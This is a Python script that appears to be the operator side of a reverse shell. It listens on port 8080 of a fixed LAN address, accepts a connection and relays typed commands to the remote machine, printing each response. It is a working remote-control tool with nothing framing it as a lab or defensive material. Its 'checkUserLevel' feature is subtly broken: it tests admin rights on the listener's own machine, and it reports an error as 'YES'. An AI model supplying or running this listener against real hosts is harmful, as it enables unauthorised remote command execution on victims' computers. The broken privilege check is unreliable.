import socket
import os
import ctypes

def check_admin_access():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin() != 0    # Windows admin check (non-zero = admin)
    except Exception as e:
        return f"Error checking admin status: {e}"           # Handle any exceptions during check

def connect():
    print("=" * 50)
    print("[+] Listening for incoming TCP connections on port 8080")
    mySocket = socket.socket()
    mySocket.bind(("192.168.83.128", 8080)) 
    mySocket.listen(1)
    connection, address = mySocket.accept()
    print("=" * 50)
    print(f"Connection established: {address}")
    
    while True:
        try:
            command = input("Shell > ")
            if command == "checkUserLevel":                   # Special command to check Windows privileges
                is_admin = check_admin_access()
                print(f"Admin privileges: {'YES' if is_admin else 'NO'}")
                continue                                      # Continue to next command
            elif "terminate" in command:
                connection.send("terminate".encode())
                connection.close()
                break
            else:
                connection.send(command.encode())
                response = connection.recv(5000).decode()
                if not response:  # Empty response could indicate closed connection
                    print("Connection may have been closed by the client")
                    break
                print(response)
        except BrokenPipeError:
            print("Connection lost - the client has disconnected")
            break
        except ConnectionResetError:
            print("Connection was reset by the client")
            break
        except Exception as e:
            print(f"An error occurred: {e}")
            break
    
    # Always ensure the socket is closed properly
    try:
        connection.close()
    except:
        pass

def main():
    try:
        connect()
    except Exception as e:
        print(f"Failed to establish connection: {e}")

if __name__ == "__main__":
    main()
